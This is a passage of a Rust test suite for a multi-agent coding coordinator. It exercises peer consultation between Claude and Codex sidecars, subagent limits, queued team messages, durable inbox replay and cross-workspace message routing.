            Some("claude-opus-5-5".to_string()),
            Some("high".to_string()),
        )
        .await
        .unwrap_err()
        .to_string();
    assert!(error.contains("Claude cannot spawn"));
    assert!(error.contains("usage is exhausted"));
    scratch.discard().await;
}

#[tokio::test]
async fn persistent_peer_consultation_reuses_the_sidecar_and_returns_to_the_primary() {
    let directory = tempdir().unwrap();
    let root = Uuid::new_v4();
    let (scratch, store) = crate::session_store::postgres::testing::session_store().await;
    let store = Arc::new(store);
    store.create_session(root).await.unwrap();
    let prompts = Arc::new(StdMutex::new(Vec::new()));
    let executor = RecordingPeerExecutor {
        prompts: Arc::clone(&prompts),
    };
    let mut root_launch = launch();
    root_launch.capabilities.multiplayer = false;
    root_launch.cwd = directory.path().to_path_buf();
    let coordinator = SubagentCoordinator::new_with_store_and_executor(
        directory.path(),
        root,
        root_launch,
        3,
        Arc::new(executor),
        store,
    )
    .unwrap();

    let first = coordinator
        .consult_peer(CodingProvider::Codex, None, "Compare the API boundaries.")
        .await
        .unwrap();
    let first_thread = first["thread"].as_str().unwrap().to_string();
    let second = coordinator
        .consult_peer(
            CodingProvider::Codex,
            None,
            "Now revisit the cancellation edge case.",
        )
        .await
        .unwrap();
    let reverse = coordinator
        .consult_peer(
            CodingProvider::Claude,
            None,
            "As the Claude primary, ask GPT to challenge the conclusion.",
        )
        .await
        .unwrap();

    assert_eq!(first["persistent"], true);
    assert_eq!(first["provider"], "claude");
    assert_eq!(first["response"], "persistent peer reply 1");
    assert_eq!(second["response"], "persistent peer reply 2");
    assert_eq!(second["thread"], first_thread);
    assert_eq!(reverse["provider"], "codex");
    assert_eq!(reverse["thread"], "/root/gpt");
    assert_eq!(reverse["response"], "persistent peer reply 3");
    let prompts = prompts.lock().unwrap().clone();
    assert_eq!(prompts.len(), 3);
    assert!(prompts[0].contains("Compare the API boundaries."));
    assert!(prompts[1].contains("cancellation edge case"));
    assert!(prompts[0].contains("persistent private Claude peer"));
    assert!(prompts[2].contains("As the Claude primary"));
    coordinator.stop("/root/claude").await.unwrap();
    coordinator.stop("/root/gpt").await.unwrap();
    scratch.discard().await;
}

#[tokio::test]
async fn canceled_peer_consultation_is_queued_privately_and_cannot_satisfy_the_next_call() {
    let directory = tempdir().unwrap();
    let root = Uuid::new_v4();
    let (scratch, store) = crate::session_store::postgres::testing::session_store().await;
    let store = Arc::new(store);
    store.create_session(root).await.unwrap();
    let calls = Arc::new(AtomicUsize::new(0));
    let first_started = Arc::new(tokio::sync::Notify::new());
    let release_first = Arc::new(tokio::sync::Notify::new());
    let executor = ControlledPeerExecutor {
        calls: Arc::clone(&calls),
        first_started: Arc::clone(&first_started),
        release_first: Arc::clone(&release_first),
    };
    let mut root_launch = launch();
    root_launch.capabilities.multiplayer = false;
    root_launch.cwd = directory.path().to_path_buf();
    let coordinator = SubagentCoordinator::new_with_store_and_executor(
        directory.path(),
        root,
        root_launch,
        2,
        Arc::new(executor),
        store.clone(),
    )
    .unwrap();

    let started = first_started.notified();
    tokio::pin!(started);
    let first = tokio::spawn({
        let coordinator = coordinator.clone();
        async move {
            coordinator
                .consult_peer(CodingProvider::Codex, None, "first consultation")
                .await
        }
    });
    started.await;
    let sidecar = coordinator.resolve_snapshot("/root/claude").await.unwrap();
    first.abort();
    assert!(first.await.unwrap_err().is_cancelled());

    let second = tokio::spawn({
        let coordinator = coordinator.clone();
        async move {
            coordinator
                .consult_peer(CodingProvider::Codex, None, "second consultation")
                .await
        }
    });
    let mut queued_second = false;
    for _ in 0..200 {
        queued_second = store
            .read(sidecar.session_id)
            .await
            .unwrap()
            .iter()
            .any(|event| {
                matches!(
                    &event.kind,
                    SessionEventKind::Message {
                        actor: EventActor::User,
                        text,
                        status: MessageStatus::Queued,
                        ..
                    } if text.contains("second consultation")
                )
            });
        if queued_second {
            break;
        }
        tokio::time::sleep(Duration::from_millis(5)).await;
    }
    assert!(
        queued_second,
        "the second consultation was not safely queued"
    );

    release_first.notify_one();
    let second = tokio::time::timeout(Duration::from_secs(3), second)
        .await
        .expect("second consultation should finish")
        .unwrap()
        .unwrap();
    assert_eq!(second["response"], "peer final 2");
    assert_eq!(calls.load(Ordering::SeqCst), 2);

    let mut abandoned_result = None;
    for _ in 0..200 {
        abandoned_result = coordinator
            .take_root_inbox()
            .await
            .into_iter()
            .find(|message| message.text.contains("peer final 1"));
        if abandoned_result.is_some() {
            break;
        }
        tokio::time::sleep(Duration::from_millis(5)).await;
    }
    let abandoned_result = abandoned_result.expect("abandoned result should reach the director");
    assert_eq!(abandoned_result.delivery, PromptDelivery::Queue);
    assert!(abandoned_result.text.contains("original tool call ended"));
    coordinator.stop("/root/claude").await.unwrap();
    scratch.discard().await;
}

#[tokio::test]
async fn persistent_peer_empty_turn_fails_at_its_correlated_completion_boundary() {
    let directory = tempdir().unwrap();
    let root = Uuid::new_v4();
    let (scratch, store) = crate::session_store::postgres::testing::session_store().await;
    let store = Arc::new(store);
    store.create_session(root).await.unwrap();
    let mut root_launch = launch();
    root_launch.capabilities.multiplayer = false;
    root_launch.cwd = directory.path().to_path_buf();
    let coordinator = SubagentCoordinator::new_with_store_and_executor(
        directory.path(),
        root,
        root_launch,
        2,
        Arc::new(EmptyPeerExecutor),
        store,
    )
    .unwrap();

    let error = tokio::time::timeout(
        Duration::from_secs(2),
        coordinator.consult_peer(CodingProvider::Codex, None, "return no answer"),
    )
    .await
    .expect("empty peer turn should fail immediately")
    .unwrap_err()
    .to_string();
    assert!(error.contains("empty response"));
    coordinator.stop("/root/claude").await.unwrap();
    scratch.discard().await;
}

#[test]
fn cross_provider_peer_does_not_inherit_an_incompatible_model_or_effort() {
    assert_eq!(
        default_model_for_cross_provider_peer(CodingProvider::Claude).as_deref(),
        Some(borg_provider::claude_product_model())
    );
    assert_eq!(
        default_effort_for_cross_provider_peer(CodingProvider::Claude).as_deref(),
        Some(borg_provider::claude_default_effort())
    );
    assert_eq!(
        default_model_for_cross_provider_peer(CodingProvider::Codex).as_deref(),
        Some(borg_provider::codex_product_model())
    );
    assert_eq!(
        default_model_for_cross_provider_peer(CodingProvider::OpenRouter).as_deref(),
        Some(borg_provider::openrouter_product_model())
    );
    assert_eq!(
        default_effort_for_cross_provider_peer(CodingProvider::OpenRouter),
        None
    );
}

#[test]
fn persistent_peer_defaults_to_the_opposite_provider_and_stable_sidecar_profile() {
    let (provider, model, effort) =
        resolve_persistent_peer_profile(CodingProvider::Codex, None).unwrap();
    assert_eq!(provider, CodingProvider::Claude);
    assert_eq!(
        model.as_deref(),
        Some(borg_provider::claude_product_model())
    );
    assert_eq!(effort.as_deref(), Some("high"));

    let (provider, model, effort) =
        resolve_persistent_peer_profile(CodingProvider::Claude, None).unwrap();
    assert_eq!(provider, CodingProvider::Codex);
    assert_eq!(model.as_deref(), Some(borg_provider::codex_product_model()));
    assert_eq!(
        effort.as_deref(),
        Some(borg_provider::codex_default_effort())
    );

    let (provider, model, effort) =
        resolve_persistent_peer_profile(CodingProvider::Codex, Some("claude-fable-5-1@high"))
            .unwrap();
    assert_eq!(provider, CodingProvider::Claude);
    assert_eq!(model.as_deref(), Some("claude-fable-5-1"));
    assert_eq!(effort.as_deref(), Some("high"));

    let (provider, model, effort) =
        resolve_persistent_peer_profile(CodingProvider::Codex, Some("claude-sonnet-5@low"))
            .unwrap();
    assert_eq!(provider, CodingProvider::Claude);
    assert_eq!(model.as_deref(), Some("claude-sonnet-5"));
    assert_eq!(effort.as_deref(), Some("low"));
}

#[test]
fn live_child_limit_and_task_names_are_enforced() {
    let mut table = SubagentTable {
        root_session_id: Uuid::new_v4(),
        max_children: 1,
        entries: HashMap::new(),
        task_names: HashMap::new(),
    };
    let child = table.reserve("first", &launch()).unwrap();
    assert!(table.reserve("second", &launch()).is_err());
    table
        .entries
        .get_mut(&child.session_id)
        .unwrap()
        .snapshot
        .status = SubagentStatus::Stopped;
    assert!(table.reserve("second", &launch()).is_ok());
    assert!(table.reserve("SECOND", &launch()).is_err());
}

#[test]
fn ready_children_do_not_consume_live_child_limit() {
    let mut table = SubagentTable {
        root_session_id: Uuid::new_v4(),
        max_children: 1,
        entries: HashMap::new(),
        task_names: HashMap::new(),
    };
    let child = table.reserve("completed", &launch()).unwrap();
    table
        .entries
        .get_mut(&child.session_id)
        .unwrap()
        .snapshot
        .status = SubagentStatus::Ready;

    assert!(table.reserve("new_work", &launch()).is_ok());
}

#[tokio::test]
async fn an_idle_child_releases_retained_context_and_a_stop_still_stops() {
    let table = Arc::new(Mutex::new(SubagentTable {
        root_session_id: Uuid::new_v4(),
        max_children: 4,
        entries: HashMap::new(),
        task_names: HashMap::new(),
    }));
    let (child_id, mut released_rx) = {
        let mut table = table.lock().await;
        let child = table.reserve("worker", &launch()).unwrap();
        let (commands, released_rx) = mpsc::channel(4);
        let entry = table.entries.get_mut(&child.session_id).unwrap();
        entry.snapshot.status = SubagentStatus::Running;
        entry.commands = Some(commands);
        (child.session_id, released_rx)
    };

    update_from_session_event(
        &table,
        child_id,
        &SessionEvent::new(
            child_id,
            1,
            SessionEventKind::StatusChanged {
                status: SessionStatus::Ready,
                detail: None,
            },
        ),
    )
    .await;

    {
        let table = table.lock().await;
        let entry = table.entries.get(&child_id).unwrap();
        assert_eq!(entry.snapshot.status, SubagentStatus::Ready);
        assert!(
            entry.commands.is_some(),
            "an idle child must stay addressable and wakeable"
        );
        assert!(!entry.dormant);
    }
    assert!(matches!(
        released_rx.try_recv(),
        Ok(HostCommand::ReleaseRetainedContext { session_id }) if session_id == child_id
    ));

    update_from_session_event(
        &table,
        child_id,
        &SessionEvent::new(
            child_id,
            2,
            SessionEventKind::StatusChanged {
                status: SessionStatus::Stopped,
                detail: None,
            },
        ),
    )
    .await;
    assert!(matches!(
        finish_agent(&table, child_id, None).await,
        Some(SubagentActivity::Stopped { .. })
    ));
    assert_eq!(
        table.lock().await.entries[&child_id].snapshot.status,
        SubagentStatus::Stopped
    );
}

#[tokio::test]
async fn child_messages_are_team_scoped_and_can_report_to_root() {
    let directory = tempdir().unwrap();
    let root = Uuid::new_v4();
    let (scratch, store) = crate::session_store::postgres::testing::session_store().await;
    let store = Arc::new(store);
    store.create_session(root).await.unwrap();
    let coordinator = SubagentCoordinator::new_with_store_and_executor(
        directory.path(),
        root,
        launch(),
        3,
        Arc::new(crate::LocalAgentTurnExecutor::default()),
        store.clone(),
    )
    .unwrap();
    let worker = coordinator
        .table
        .lock()
        .await
        .reserve("worker", &launch())
        .unwrap();
    bind_test_team(directory.path(), store.as_ref(), root, &[worker.session_id]).await;
    let mut wake = coordinator.subscribe_root_messages();
    let mut activity = coordinator.subscribe();

    coordinator
        .send_message_as(worker.session_id, "/root", "blocked on an API decision")
        .await
        .unwrap();
    let projected = activity.recv().await.unwrap();
    assert!(matches!(
        projected,
        SubagentActivity::SessionEvent {
            event: SessionEvent {
                kind: SessionEventKind::Message {
                    actor: crate::EventActor::Assistant,
                    status: MessageStatus::Complete,
                    ref text,
                    ..
                },
                ..
            },
            ..
        } if text == "blocked on an API decision"
    ));
    assert!(matches!(
        wake.try_recv(),
        Err(broadcast::error::TryRecvError::Empty)
    ));
    let notifications = coordinator.take_root_inbox().await;
    assert_eq!(notifications.len(), 1);
    assert_eq!(notifications[0].delivery, PromptDelivery::Queue);

    coordinator
        .followup_task_as(worker.session_id, "/root", "please review")
        .await
        .unwrap();
    let followup = wake.recv().await.unwrap();
    assert!(followup.text.contains("please review"));
    assert!(coordinator.take_root_inbox().await.is_empty());
    let receipt = coordinator
        .call_tool_as(
            worker.session_id,
            "send_message",
            json!({
                "target": "/root", "message": "explicit wake", "wake": true
            }),
        )
        .await
        .unwrap();
    assert_eq!(receipt["delivery_mode"], "boundary");
    assert!(wake.recv().await.unwrap().text.contains("explicit wake"));
    scratch.discard().await;
}

#[tokio::test]
async fn durable_root_inbox_poll_replays_a_report_when_wake_delivery_was_missed() {
    let directory = tempdir().unwrap();
    let root = Uuid::new_v4();
    let (scratch, store) = crate::session_store::postgres::testing::session_store().await;
    let store = Arc::new(store);
    store.create_session(root).await.unwrap();
    let coordinator = SubagentCoordinator::new_with_store_and_executor(
        directory.path(),
        root,
        launch(),
        3,
        Arc::new(crate::LocalAgentTurnExecutor::default()),
        store.clone(),
    )
    .unwrap();
    let worker = coordinator
        .table
        .lock()
        .await
        .reserve("worker", &launch())
        .unwrap();
    bind_test_team(directory.path(), store.as_ref(), root, &[worker.session_id]).await;

    // No root receiver exists. The durable inbox must retain the wake and
    // replay it when the root session reconnects.
    coordinator
        .followup_task_as(worker.session_id, "/root", "durable result")
        .await
        .unwrap();

    let mut wake = coordinator.subscribe_root_messages();
    let reports = coordinator.refresh_root_inbox_reports().await.unwrap();
    assert_eq!(reports.len(), 1);
    let (message_id, SubagentActivity::SessionEvent { event, .. }) = &reports[0] else {
        panic!("expected a durable child report projection");
    };
    assert!(matches!(
        &event.kind,
        SessionEventKind::Message {
            actor: crate::EventActor::Assistant,
            text,
            status: MessageStatus::Complete,
            ..
        } if text == "durable result"
    ));
    coordinator.mark_root_message_projected(*message_id).await;
    coordinator.wake_pending_root_messages().await;
    let wake = wake.recv().await.unwrap();
    assert_eq!(wake.delivery, PromptDelivery::Steer);
    assert!(wake.text.contains("durable result"));
    assert!(coordinator.take_root_inbox().await.is_empty());
    scratch.discard().await;
}

#[tokio::test]
async fn durable_root_wake_retries_after_the_receiver_is_lost() {
    let directory = tempdir().unwrap();
    let root = Uuid::new_v4();
    let (scratch, store) = crate::session_store::postgres::testing::session_store().await;
    let store = Arc::new(store);
    store.create_session(root).await.unwrap();
    let coordinator = SubagentCoordinator::new_with_store_and_executor(
        directory.path(),
        root,
        launch(),
        3,
        Arc::new(crate::LocalAgentTurnExecutor::default()),
        store.clone(),
    )
    .unwrap();
    let worker = coordinator
        .table
        .lock()
        .await
        .reserve("worker", &launch())
        .unwrap();
    bind_test_team(directory.path(), store.as_ref(), root, &[worker.session_id]).await;

    // A broadcast can report success even when the receiver disappears
    // before reading it. The durable poll must retry after the grace
    // interval instead of treating that send as an acknowledgement.
    let first_wake = coordinator.subscribe_root_messages();
    coordinator
        .followup_task_as(worker.session_id, "/root", "retry this report")
        .await
        .unwrap();
    drop(first_wake);

    tokio::time::sleep(ROOT_MESSAGE_RETRY_INTERVAL + Duration::from_millis(25)).await;
    let mut wake = coordinator.subscribe_root_messages();
    let reports = coordinator.refresh_root_inbox_reports().await.unwrap();
    assert_eq!(reports.len(), 1);
    let (message_id, _) = &reports[0];
    coordinator.mark_root_message_projected(*message_id).await;
    coordinator.wake_pending_root_messages().await;

    let message = wake.recv().await.unwrap();
    assert_eq!(message.delivery, PromptDelivery::Steer);
    assert!(message.text.contains("retry this report"));
    scratch.discard().await;
}

#[tokio::test]
async fn sibling_messages_use_the_shared_team_directory() {
    let directory = tempdir().unwrap();
    let root = Uuid::new_v4();
    let (scratch, store) = crate::session_store::postgres::testing::session_store().await;
    let store = Arc::new(store);
    store.create_session(root).await.unwrap();
    let coordinator = SubagentCoordinator::new_with_store_and_executor(
        directory.path(),
        root,
        launch(),
        3,
        Arc::new(crate::LocalAgentTurnExecutor::default()),
        store.clone(),
    )
    .unwrap();
    let mut table = coordinator.table.lock().await;
    let sender = table.reserve("sender", &launch()).unwrap();
    let recipient = table.reserve("recipient", &launch()).unwrap();
    let (commands, mut received) = mpsc::channel(1);
    let entry = table.entries.get_mut(&recipient.session_id).unwrap();
    entry.snapshot.status = SubagentStatus::Running;
    entry.commands = Some(commands);
    drop(table);
    bind_test_team(
        directory.path(),
        store.as_ref(),
        root,
        &[sender.session_id, recipient.session_id],
    )
    .await;

    coordinator
        .send_message_as(sender.session_id, "recipient", "share the benchmark")
        .await
        .unwrap();
    let HostCommand::TeamPrompt {
        session_id,
        text,
        delivery,
        ..
    } = received.recv().await.unwrap()
    else {
        panic!("expected prompt");
    };
    assert_eq!(session_id, recipient.session_id);
    assert_eq!(delivery, PromptDelivery::Queue);
    assert!(text.contains("Team message from /root/sender"));
    assert!(text.contains("share the benchmark"));

    let broadcast = coordinator
        .broadcast_message_as(sender.session_id, "team checkpoint")
        .await
        .unwrap();
    let HostCommand::TeamPrompt { message_id, .. } = received.recv().await.unwrap() else {
        panic!("expected broadcast prompt");
    };
    assert_eq!(message_id, broadcast.message_id);
    assert_eq!(
        coordinator.take_root_inbox().await[0].message_id,
        broadcast.message_id
    );
    let workspace = store
        .workspace_store()
        .await
        .unwrap()
        .expect("session store exposes the canonical workspace projection");
    let binding = store
        .workspace_binding(recipient.session_id)
        .await
        .unwrap()
        .unwrap();
    assert_eq!(
        workspace
            .deliveries_after(binding.workspace_id, binding.participant_id, 0, 10)
            .await
            .unwrap()
            .iter()
            .filter(|delivery| delivery.sequence > 0)
            .count(),
        2
    );
    coordinator
        .acknowledge_message_for_session(recipient.session_id, broadcast.message_id)
        .await
        .unwrap();
    assert!(
        coordinator
            .unread_messages_for_session(recipient.session_id)
            .await
            .unwrap()
            .iter()
            .all(|message| message.message_id != broadcast.message_id)
    );
    scratch.discard().await;
}

#[tokio::test]
async fn waking_a_child_preserves_queued_team_message_provenance() {
    let directory = tempdir().unwrap();
    let root = Uuid::new_v4();
    let (scratch, store) = crate::session_store::postgres::testing::session_store().await;
    let store = Arc::new(store);
    store.create_session(root).await.unwrap();
    let executor = RecordingPeerExecutor::default();
    let mut child_launch = launch();
    child_launch.cwd = directory.path().to_path_buf();
    let coordinator = SubagentCoordinator::new_with_store_and_executor(
        directory.path(),
        root,
        child_launch.clone(),
        2,
        Arc::new(executor.clone()),
        store.clone(),
    )
    .unwrap();
    let child = {
        let mut table = coordinator.table.lock().await;
        let child = table.reserve("worker", &child_launch).unwrap();
        table
            .entries
            .get_mut(&child.session_id)
            .unwrap()
            .snapshot
            .status = SubagentStatus::Ready;
        child
    };
    bind_test_team(directory.path(), store.as_ref(), root, &[child.session_id]).await;
    let message_id = coordinator
        .route_message_with_options_as(
            root,
            "worker",
            "the paused worker's report",
            TeamMessageOptions::default(),
        )
        .await
        .unwrap()
        .receipt
        .unwrap()
        .message_id;
    let mut activity = coordinator.subscribe();

    coordinator
        .start_reserved(child.clone(), child_launch, false)
        .await
        .unwrap();
    let actor = tokio::time::timeout(Duration::from_secs(5), async {
        loop {
            let item = activity.recv().await;
            if let Ok(SubagentActivity::SessionEvent { event, .. }) = item
                && let SessionEventKind::Message {
                    message_id: id,
                    actor,
                    ..
                } = event.kind
                && id == message_id
            {
                break actor;
            }
        }
    })
    .await
    .expect("the awakened child journals its queued inbox");
    assert_eq!(actor, EventActor::System);
    assert!(executor.prompts.lock().unwrap().is_empty());

    coordinator.stop_all().await;
    scratch.discard().await;
}

#[tokio::test]
async fn a_cross_participant_message_names_a_reply_target_the_recipient_can_reach() {
    // "/root" resolves to the reader's OWN root in every process, so telling a
    // peer to reply there addressed it back to itself and failed as "message
    // recipient must differ from its author". A peer must be handed its
    // sender's participant address instead.
    let directory = tempdir().unwrap();
    let first = Uuid::new_v4();
    let second = Uuid::new_v4();
    let workspace_id = Uuid::new_v4();
    let (scratch, store) = crate::session_store::postgres::testing::session_store().await;
    let store = Arc::new(store);
    store
        .create_session_in_workspace(first, workspace_id)
        .await
        .unwrap();
    store
        .create_session_in_workspace(second, workspace_id)
        .await
        .unwrap();
    let workspace = store.workspace_store().await.unwrap().unwrap();
    let human = crate::local_human_participant_id("Human");
    for (session, label) in [(first, "First root"), (second, "Second root")] {
        workspace
            .ensure_execution_workspace(
                workspace_id,
                "shared project",
                human,
                "Human",
                session,
                label,
            )
            .await
            .unwrap();
    }
    let coordinator = SubagentCoordinator::new_with_store_and_executor(
        directory.path(),
        first,
        launch(),
        1,
        Arc::new(crate::LocalAgentTurnExecutor::default()),
        store,
    )
    .unwrap();

    let (inbox, _receipt) = coordinator
        .persist_team_message(
            first,
            second,
            "/root",
            "density pass is done",
            crate::contract::PromptDelivery::Queue,
            DeliveryMode::NextTurn,
            TeamMessageOptions::default(),
        )
        .await
        .unwrap();

    assert!(
        inbox.text.contains(&format!("participant:{first}")),
        "a peer in another process must be given an addressable reply target, got: {}",
        inbox.text
    );
    assert!(
        !inbox.text.contains("target \"/root\""),
        "\"/root\" addresses the recipient back to itself, got: {}",
        inbox.text
    );
    // The sender is still identified by its task name; only the reply
    // address changes.
    assert!(inbox.text.contains("Team message from /root:"));
    scratch.discard().await;
}

#[tokio::test]
async fn independent_sessions_share_workspace_broadcasts_exactly_once() {
    let directory = tempdir().unwrap();
    let first = Uuid::new_v4();
    let second = Uuid::new_v4();
    let workspace_id = Uuid::new_v4();
    let (scratch, store) = crate::session_store::postgres::testing::session_store().await;
    let store = Arc::new(store);
    store
        .create_session_in_workspace(first, workspace_id)
        .await
        .unwrap();
    store
        .create_session_in_workspace(second, workspace_id)
        .await
        .unwrap();
    let workspace = store.workspace_store().await.unwrap().unwrap();
    let human = crate::local_human_participant_id("Human");
    workspace
        .ensure_execution_workspace(
            workspace_id,
            "shared project",
            human,
            "Human",
            first,
            "First root",
        )
        .await
        .unwrap();
    workspace
        .ensure_execution_workspace(
            workspace_id,
            "shared project",
            human,
            "Human",
            second,
            "Second root",
        )
        .await
        .unwrap();
    let first_coordinator = SubagentCoordinator::new_with_store_and_executor(
        directory.path(),
        first,
        launch(),
        1,
        Arc::new(crate::LocalAgentTurnExecutor::default()),
        store.clone(),
    )
    .unwrap();
    let second_coordinator = SubagentCoordinator::new_with_store_and_executor(
        directory.path(),
        second,
        launch(),
        1,
        Arc::new(crate::LocalAgentTurnExecutor::default()),
        store,
    )
    .unwrap();

    let receipt = first_coordinator
        .broadcast_message_as(first, "workspace checkpoint")
        .await
        .unwrap();
    assert!(receipt.recipient_ids.contains(&second));
    assert_eq!(
        receipt.recipient_ids.len(),
        2,
        "the other root and human participant receive the workspace broadcast"
    );
    let unread = second_coordinator
        .unread_messages_for_session(second)
        .await
        .unwrap();
    assert_eq!(unread.len(), 1);
    assert_eq!(unread[0].message_id, receipt.message_id);
    second_coordinator
        .acknowledge_message_for_session(second, receipt.message_id)
        .await
        .unwrap();
    assert!(
        second_coordinator
            .unread_messages_for_session(second)
            .await
            .unwrap()
            .is_empty()
    );

    let roster = first_coordinator
        .call_tool_as(first, "list_workspace_participants", json!({}))
        .await
        .unwrap();
    assert!(
        roster["participants"]
            .as_array()
            .is_some_and(|participants| {
                participants
                    .iter()
                    .any(|entry| entry["participant"]["id"] == second.to_string())
            })
    );
    let direct = first_coordinator
        .call_tool_as(
            first,
            "send_message",
            json!({
                "target": format!("participant:{second}"),
                "message": "participant-addressed checkpoint"
            }),
        )
        .await
        .unwrap();
    assert_eq!(direct["recipient_count"], 1);
    let direct_id: Uuid = serde_json::from_value(direct["message_id"].clone()).unwrap();
    assert!(
        second_coordinator
            .unread_messages_for_session(second)
            .await
            .unwrap()
            .iter()
            .any(|message| message.message_id == direct_id)
    );
    scratch.discard().await;
}

#[tokio::test]
async fn explicitly_addressed_sessions_get_an_authorized_cross_workspace_channel() {
    #[cfg(unix)]
    let directory = tempfile::Builder::new()
        .prefix("borg-dm-")
        .tempdir_in("/tmp")
        .unwrap();
    #[cfg(not(unix))]
    let directory = tempdir().unwrap();
    let sender = Uuid::new_v4();
    let recipient = Uuid::new_v4();
    let (scratch, store) = crate::session_store::postgres::testing::session_store().await;
    let store = Arc::new(store);
    store.create_session(sender).await.unwrap();
    store.create_session(recipient).await.unwrap();
    let workspace = store.workspace_store().await.unwrap().unwrap();
    let human = crate::local_human_participant_id("Human");
    workspace
        .ensure_execution_workspace(sender, "sender", human, "Human", sender, "Sender")
        .await
        .unwrap();
    workspace
        .ensure_execution_workspace(
            recipient,
            "recipient",
            human,
            "Human",
            recipient,
            "Recipient",
        )
        .await
        .unwrap();
    let host_id = Uuid::new_v4();
    for session in [sender, recipient] {
        let mut binding = store.workspace_binding(session).await.unwrap().unwrap();
        binding.host_id = Some(host_id);
        store.attach_workspace(binding).await.unwrap();
    }
    let sender_coordinator = SubagentCoordinator::new_with_store_and_executor(
        directory.path(),
        sender,
        launch(),
        1,
        Arc::new(crate::LocalAgentTurnExecutor::default()),
        store.clone(),
    )
    .unwrap();
    let recipient_coordinator = SubagentCoordinator::new_with_store_and_executor(
        directory.path(),
        recipient,
        launch(),
        1,
        Arc::new(crate::LocalAgentTurnExecutor::default()),
        store,
    )
    .unwrap();

    #[cfg(unix)]
    let (_control_servers, mut received) = {
        let mut servers = Vec::new();
        let mut receivers = Vec::new();
        for session_id in [sender, recipient] {
            let writer = crate::SessionWriterLease::try_acquire(
                directory.path().join(format!("{session_id}.lock")),
            )
            .unwrap()
            .unwrap();
            let (commands, receiver) = mpsc::channel(1);
            let server = crate::LocalSessionControlServer::start(
                crate::session_control_socket_path(directory.path(), session_id),
                session_id,
                &writer,
                commands,
            )
            .unwrap();
            servers.push((server, writer));
            receivers.push(receiver);
        }
        (servers, receivers)
    };

    let instances = sender_coordinator
        .call_tool_as(sender, "list_instances", json!({}))
        .await
        .unwrap();
    assert!(
        instances["instances"]
            .as_array()
            .unwrap()
            .iter()
            .any(|entry| {
                entry["id"] == recipient.to_string()
                    && entry["workspace_id"] == recipient.to_string()
                    && entry["local"] == true
            })
    );

    let result = sender_coordinator
        .call_tool_as(
            sender,
            "send_message",
            json!({
                "target": format!("participant:{recipient}"),
                "message": "cross-workspace handoff"
            }),
        )
        .await
        .unwrap();
    assert_eq!(result["queued"], true);
    assert_eq!(result["recipient_count"], 1);
    assert_eq!(result["dispatched_locally"], cfg!(unix));
    assert_eq!(result["relay_pending"], false);
    let message_id: Uuid = serde_json::from_value(result["message_id"].clone()).unwrap();
    #[cfg(unix)]
    assert!(matches!(
        received[1].try_recv().unwrap(),
        HostCommand::TeamPrompt {
            session_id,
            message_id: delivered_id,
            delivery: PromptDelivery::Queue,
            ..
        } if session_id == recipient && delivered_id == message_id
    ));
    let unread = recipient_coordinator
        .unread_messages_for_session(recipient)
        .await
        .unwrap();
    assert_eq!(unread.len(), 1);
    assert_eq!(unread[0].message_id, message_id);
    recipient_coordinator
        .acknowledge_message_for_session(recipient, message_id)
        .await
        .unwrap();
    assert!(
        recipient_coordinator
            .unread_messages_for_session(recipient)
            .await
            .unwrap()
            .is_empty()
    );

    let reply = recipient_coordinator
        .call_tool_as(
            recipient,
            "followup_task",
            json!({
                "target": format!("participant:{sender}"),
                "message": "handoff received"
            }),
        )
        .await
        .unwrap();
    assert_eq!(reply["workspace_id"], result["workspace_id"]);
    assert_eq!(reply["dispatched_locally"], cfg!(unix));
    #[cfg(unix)]
    assert!(matches!(
        received[0].try_recv().unwrap(),
        HostCommand::TeamPrompt {
            session_id,
            message_id: delivered_id,
            delivery: PromptDelivery::Steer,
            ..
        } if session_id == sender && reply["message_id"] == delivered_id.to_string()
    ));
    let replies = sender_coordinator
        .unread_messages_for_session(sender)
        .await
        .unwrap();
    assert_eq!(replies.len(), 1);
    assert_eq!(replies[0].delivery, PromptDelivery::Steer);
    assert!(
        !workspace
            .workspace_roster(sender, sender)
            .await
            .unwrap()
            .iter()
            .any(|entry| entry.participant.id == recipient)
    );
    assert!(
        !workspace
            .workspace_roster(recipient, recipient)
            .await
            .unwrap()
            .iter()
            .any(|entry| entry.participant.id == sender)
    );

    let unknown = Uuid::new_v4();
    assert!(
        sender_coordinator
            .call_tool_as(
                sender,
                "send_message",
                json!({"target": format!("session:{unknown}"), "message": "not authorized"}),
            )
            .await
            .unwrap_err()
            .to_string()
            .contains("unknown message target")
    );

    // A discovered remote instance has no local binding; session-style and
    // attributed-label targets must fall back to participant routing.
    let remote = Uuid::new_v4();
    workspace
        .upsert_instance(
            crate::workspace::Participant {
                id: remote,
                display_name: "remote-agent".to_string(),
                kind: crate::workspace::ParticipantKind::Agent,
                created_at: chrono::Utc::now(),
            },
            Some(Uuid::new_v4()),
            None,
        )
        .await
        .unwrap();
    for target in [
        format!("session:{remote}"),
        format!("remote-agent ({remote})"),
    ] {
        let routed = sender_coordinator
            .call_tool_as(
                sender,
                "send_message",
                json!({"target": target, "message": "handoff to remote"}),
            )
            .await
            .unwrap();
        assert_eq!(routed["delivery_state"], "relay_pending");
        assert_eq!(routed["recipient_ids"][0], remote.to_string());
        assert_eq!(routed["sender"], format!("participant:{sender}"));
        let status = sender_coordinator
            .call_tool_as(
                sender,
                "get_message_status",
                json!({"message_id": routed["message_id"]}),
            )
            .await
            .unwrap();
        assert_eq!(status["deliveries"][0]["recipient_id"], remote.to_string());
        assert_eq!(status["deliveries"][0]["state"], "pending");
        assert_eq!(status["deliveries"][0]["attempts"], 0);
    }
    let listed = sender_coordinator
        .call_tool_as(
            sender,
            "list_instances",
            json!({"query": "REMOTE-", "limit": 1}),
        )
        .await
        .unwrap();
    assert_eq!(listed["participant_id"], sender.to_string());
    assert_eq!(listed["total"], 1);
    assert_eq!(listed["truncated"], false);
    assert_eq!(listed["instances"][0]["id"], remote.to_string());
    assert_eq!(listed["instances"][0]["local"], false);
    assert_eq!(listed["instances"][0]["live"], false);
    assert_eq!(listed["instances"][0]["stale"], false);
    assert!(listed["instances"][0]["seen_at"].is_string());
    let listed = sender_coordinator
        .call_tool_as(sender, "list_instances", json!({"host_id": host_id}))
        .await
        .unwrap();
    let local_entry = listed["instances"]
        .as_array()
        .unwrap()
        .iter()
        .find(|entry| entry["id"] == recipient.to_string())
        .expect("local recipient is listed by host");
    assert_eq!(local_entry["local"], true);
    assert_eq!(local_entry["live"], cfg!(unix));
    assert_eq!(local_entry["workspace_name"], "recipient");
    scratch.discard().await;
}

#[tokio::test]
async fn focused_human_prompt_and_recall_target_the_exact_child_actor() {
    let directory = tempdir().unwrap();
    let root = Uuid::new_v4();
    let (scratch, store) = crate::session_store::postgres::testing::session_store().await;
    let store = Arc::new(store);
    store.create_session(root).await.unwrap();
